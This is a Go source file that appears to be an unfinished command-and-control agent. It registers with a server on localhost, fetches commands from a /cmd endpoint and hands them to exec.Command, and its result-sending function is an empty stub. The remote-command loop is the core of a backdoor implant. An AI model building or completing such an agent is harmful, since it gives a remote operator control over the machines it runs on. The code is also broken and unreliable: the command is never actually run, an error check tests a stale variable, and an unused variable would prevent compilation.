package utils

import (
	"encoding/json"
	"errors"
	"io"
	"log"
	"net/http"
	"os/exec"
)

const BASE_URL = "http://127.0.0.1:8000"

func GetAgentId() string {
	resp, err := http.Post(BASE_URL+"/connect", "", nil)
	if err != nil {
		log.Fatalln(err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Fatalln(err)
	}

	type Response struct {
		Token string `json:"agent_id"`
	}

	var result Response
	err = json.Unmarshal(body, &result)
	if err != nil {
		log.Fatalln(err)
	}

	log.Printf(result.Token)
	return result.Token
}

func GetCommand(agentId string) {

	/***
		type DataSend struct {
			AgentId string `json:"agent_id"`
		}

		dataSend := DataSend{AgentId: agentId}

		data, err := json.Marshal(dataSend)
		if err != nil {
			log.Fatalln(err)
		}
	    ***/

	resp, err := http.Post(BASE_URL+"/cmd/"+agentId, "application/json", nil)
	if err != nil {
		log.Fatalln(err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	log.Printf("Body BRUTE : %s", body)
	if err != nil {
		log.Fatalln(err)
	}

	type Response struct {
		Task_id string `json:"task_id"`
		Command string `json:"command"`
	}

	var result Response
	err = json.Unmarshal(body, &result)
	if err != nil {
		log.Fatalln(err)
	}

	log.Printf(result.Command)

	// Execution de la commande
	resultAction := exec.Command(result.Command)
	if errors.Is(err, exec.ErrDot) {
		err = nil
	}
	if err != nil {
		log.Fatal(err)
	}

	// Enregistrement du résultat

}
func sendResult() {}
func die()        {}
